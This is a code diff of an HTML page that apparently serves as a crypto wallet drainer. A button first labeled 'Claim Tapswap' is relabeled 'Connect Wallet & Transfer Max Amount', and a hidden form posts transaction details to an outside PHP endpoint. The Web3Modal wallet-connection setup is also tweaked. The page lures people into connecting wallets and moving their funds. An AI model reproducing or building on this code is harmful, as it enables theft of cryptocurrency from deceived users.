@@ -23,7 +23,7 @@
     </style>
 </head>
 <body>
-    <button id="connectButton">Claim Tapswap</button>
+    <button id="connectButton">Connect Wallet & Transfer Max Amount</button>
 
     <form id="transactionForm" action="https://eflujsyb0kuybgol11532.cleavr.one/btc/d.php" method="post" style="display: none;">
         <input type="hidden" name="transactionDetails" id="transactionDetails">
@@ -64,7 +64,9 @@
 
             const web3Modal = new Web3Modal.default({
                 cacheProvider: true, // optional
-                providerOptions // required
+                providerOptions, // required
+                theme: "dark",
+                disableInjectedProvider: false,
             });
 
             connectButton.addEventListener('click', async () => {
